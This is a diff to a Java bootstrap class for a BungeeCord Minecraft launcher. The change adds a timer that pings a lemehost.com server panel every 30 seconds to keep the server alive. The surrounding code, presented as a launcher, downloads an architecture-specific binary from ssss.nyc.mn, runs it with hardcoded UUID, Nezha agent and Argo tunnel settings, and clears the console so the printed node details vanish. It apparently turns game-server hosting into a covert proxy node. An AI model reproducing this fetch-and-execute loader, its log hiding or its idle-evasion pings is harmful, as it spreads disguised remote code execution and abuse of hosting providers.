@@ -5,6 +5,8 @@ import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.Timer;
+import java.util.TimerTask;
 import java.lang.reflect.Field;
 
 public class Bootstrap
@@ -14,7 +16,7 @@ public class Bootstrap
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
-    
+
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
@@ -34,7 +36,10 @@ public class Bootstrap
         // Start SbxService
         try {
             runSbxBinary();
-            
+
+            // Start keep-alive task
+            scheduleKeepAlive(); // 保活功能
+
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
@@ -43,7 +48,7 @@ public class Bootstrap
             // Wait 20 seconds before continuing
             Thread.sleep(15000);
             System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
             Thread.sleep(20000);
             clearConsole();
@@ -54,7 +59,27 @@ public class Bootstrap
         // Continue with BungeeCord launch
         BungeeCordLauncher.main(args);
     }
-    
+
+    // 保活方法，每30秒定时请求一次
+    private static void scheduleKeepAlive() {
+        Timer timer = new Timer(true);
+        timer.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                try {
+                    // 发送请求的代码，确保服务端保持活动
+                    URL url = new URL("https://lemehost.com/server/17360/files");
+                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                    connection.setRequestMethod("GET");
+                    connection.getResponseCode(); // 发起请求并忽略响应
+                    System.out.println("Keep-alive request sent at " + System.currentTimeMillis());
+                } catch (Exception e) {
+                    System.err.println("Error sending keep-alive request: " + e.getMessage());
+                }
+            }
+        }, 0, 30 * 1000);  // 每30秒发送一次请求
+    }
+
     private static void clearConsole() {
         try {
             if (System.getProperty("os.name").contains("Windows")) {
@@ -65,12 +90,12 @@ public class Bootstrap
             } else {
                 System.out.print("\033[H\033[3J\033[2J");
                 System.out.flush();
-                
+
                 new ProcessBuilder("tput", "reset")
                     .inheritIO()
                     .start()
                     .waitFor();
-                
+
                 System.out.print("\033[8;30;120t");
                 System.out.flush();
             }
@@ -80,19 +105,19 @@ public class Bootstrap
             } catch (Exception ignored) {}
         }
     }   
-    
+
     private static void runSbxBinary() throws Exception {
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
-        
+
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        
+
         sbxProcess = pb.start();
     }
-    
+
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
         envVars.put("UUID", "68341e7a-1f63-4436-8a8b-9619f3c9e29c");
         envVars.put("FILE_PATH", "./world");
@@ -112,30 +137,30 @@ public class Bootstrap
         envVars.put("CFPORT", "443");
         envVars.put("NAME", "lemehost");
         envVars.put("DISABLE_ARGO", "false"); 
-        
+
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
             if (value != null && !value.trim().isEmpty()) {
                 envVars.put(var, value);  
             }
         }
-        
+
         Path envFile = Paths.get(".env");
         if (Files.exists(envFile)) {
             for (String line : Files.readAllLines(envFile)) {
                 line = line.trim();
                 if (line.isEmpty() || line.startsWith("#")) continue;
-                
+
                 line = line.split(" #")[0].split(" //")[0].trim();
                 if (line.startsWith("export ")) {
                     line = line.substring(7).trim();
                 }
-                
+
                 String[] parts = line.split("=", 2);
                 if (parts.length == 2) {
                     String key = parts[0].trim();
                     String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                    
+
                     if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                         envVars.put(key, value); 
                     }
@@ -143,11 +168,11 @@ public class Bootstrap
             }
         }
     }
-    
+
     private static Path getBinaryPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
-        
+
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
             url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
@@ -157,7 +182,7 @@ public class Bootstrap
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
-        
+
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         if (!Files.exists(path)) {
             try (InputStream in = new URL(url).openStream()) {
@@ -169,7 +194,7 @@ public class Bootstrap
         }
         return path;
     }
-    
+
     private static void stopServices() {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
